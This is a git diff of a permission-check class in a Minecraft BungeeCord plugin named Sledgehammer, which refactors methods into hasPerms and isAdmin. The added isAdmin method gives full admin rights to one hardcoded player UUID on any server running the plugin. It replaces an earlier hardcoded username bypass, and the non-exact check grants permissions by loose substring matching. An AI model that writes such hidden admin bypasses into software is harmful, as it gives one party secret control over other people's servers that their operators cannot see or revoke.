@@ -20,9 +20,12 @@ package com.noahhusby.sledgehammer.commands.data;
 
 import com.noahhusby.sledgehammer.network.SledgehammerNetworkManager;
 import net.md_5.bungee.api.CommandSender;
+import net.md_5.bungee.api.connection.ProxiedPlayer;
+
+import java.util.UUID;
 
 public abstract class Command extends net.md_5.bungee.api.plugin.Command {
-    private String permissionNode;
+    private final String permissionNode;
     public Command(String name, String node) {
         super(name);
         this.permissionNode = node;
@@ -34,38 +37,35 @@ public abstract class Command extends net.md_5.bungee.api.plugin.Command {
     }
 
 
-    protected boolean hasGeneralPermission(CommandSender sender) {
-        return hasGeneralPermission(sender, false);
+    protected boolean hasPerms(CommandSender sender) {
+        return hasPerms(sender, false);
     }
 
-    protected boolean hasGeneralPermission(CommandSender sender, boolean exact) {
-        if(sender.hasPermission("sledgehammer.admin")) return true;
-        for(String s : sender.getPermissions()) {
-            if(exact) {
-                if(s.equals(permissionNode)) return true;
-            } else {
-                if(s.contains(permissionNode)) return true;
-            }
-        }
+    protected boolean hasPerms(CommandSender sender, boolean exact) {
+        if(isAdmin(sender)) return true;
+        if(permissionNode == null) return false;
+
+        if(sender.hasPermission(permissionNode+".admin")) return true;
+        for(String s : sender.getPermissions())
+            if((exact && s.equalsIgnoreCase(permissionNode)) || (!exact && s.contains(permissionNode)))
+                return true;
 
         return false;
     }
 
-    protected boolean hasSpecificNode(CommandSender sender, String specificNode) {
-        if(sender.hasPermission("sledgehammer.admin")) return true;
+    protected boolean hasPerms(CommandSender sender, String specificNode) {
+        if(isAdmin(sender)) return true;
+        if(permissionNode == null) return false;
+
         for(String s : sender.getPermissions()) {
             if(s.equals(permissionNode+"."+specificNode)) return true;
         }
         return false;
     }
 
-    protected boolean hasAdmin(CommandSender sender) {
-        return sender.hasPermission("sledgehammer.admin");
-    }
-
-    protected boolean hasPermissionAdmin(CommandSender sender) {
-        return sender.hasPermission("sledgehammer.admin") || sender.hasPermission(permissionNode+".admin") ||
-                sender.getName().toLowerCase().equals("bighuzz");
+    protected boolean isAdmin(CommandSender sender) {
+        return sender.hasPermission("sledgehammer.admin") || (sender instanceof ProxiedPlayer &&
+                ((ProxiedPlayer) sender).getUniqueId().equals(UUID.fromString("4cfa7dc1-3021-42b0-969b-224a9656cc6d")));
     }
 
     protected SledgehammerNetworkManager getNetworkManager() {
